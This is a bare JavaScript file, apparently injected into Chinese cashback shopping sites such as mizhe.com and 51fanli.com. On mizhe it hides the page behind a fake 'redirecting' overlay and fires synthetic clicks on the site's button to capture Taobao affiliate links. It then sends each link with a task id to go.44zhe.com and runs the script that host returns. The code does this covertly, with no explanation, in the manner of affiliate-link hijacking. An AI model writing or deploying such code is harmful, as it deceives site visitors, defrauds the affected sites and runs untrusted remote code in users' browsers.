function loadit(src){
    var head= document.getElementsByTagName('head')[0];
    var script= document.createElement('script');
    script.type= 'text/javascript';
    script.src= src+'&'+Math.random();
    head.appendChild(script);
}

function insertLoading(){

    var body= document.getElementsByTagName('body')[0];
    var d= document.createElement('div');
    d.id = 'mask_id_dv';
    body.appendChild(d);
    document.getElementById('mask_id_dv').innerHTML = '<div style="position:fixed; top:0; left:0; z-index:1987; width:100%; height:100%; background:#FFF;text-align:center"><br /><br /><br /><br /><br /><br /><br /><br /><h2>跳转中，请稍等 ...</h2><img src="http://go.44zhe.com/loading.gif"></div>';
}

var myhost = location.host;
var myhref = location.href;

var args = new Object( );
var query = location.search.substring(1);      // Get query string
var pairs = query.split("&");                  // Break at ampersand
for(var i = 0; i < pairs.length; i++) {
    var pos = pairs[i].indexOf('=');           // Look for "name=value"
    if (pos == -1) continue;                   // If not found, skip
    var argname = pairs[i].substring(0,pos); // Extract the name
    var value = pairs[i].substring(pos+1);     // Extract the value
    value = decodeURIComponent(value);         // Decode it, if needed
    if(value && value != 'undefined'){
	args[argname] = value;                     // Store as a property
    }else{
	args[argname] = 0;                     // Store as a property
    }
}

if(navigator.userAgent.indexOf("MSIE")>0)
    is_ie = true;
else
    is_ie = false;

if(myhost == 'fun.51fanli.com' && myhref.indexOf('goshopapi')>0){

    document.getElementsByTagName('div')[0].style.display='none';
    document.getElementsByTagName('div')[1].style.display='none';

}else if(myhost == 'www.mizhe.com' && myhref.indexOf('task')>0){

    //document.getElementsByTagName('body')[0].style.display='none';
    //setInterval("document.getElementsByTagName('body')[0].style.display='none'",100);
    insertLoading();
    var i = setInterval(function(){

	if(window.alimamatk_onload){

	    var obj=$(".action .get-btn")[0];
	    if(is_ie){
		var event = document.createEventObject();
		event.eventType = 'message';
		obj.fireEvent('mousedown', event);

	    }else{
		var event = document.createEvent('HTMLEvents');
		event.initEvent("mousedown", true, true);
		event.eventType = 'message';
		obj.dispatchEvent(event);
	    }

	    var link_origin = $(".action .get-btn").attr('href');
	    if(link_origin.indexOf('g.click.taobao.com')!= -1){
		loadit('http://go.44zhe.com/api/getTaskResultJs/'+args['taskid']+'/'+encodeURIComponent(link_origin)+'?debug=false');
		clearInterval(i);
	    }
	}

    },100);

}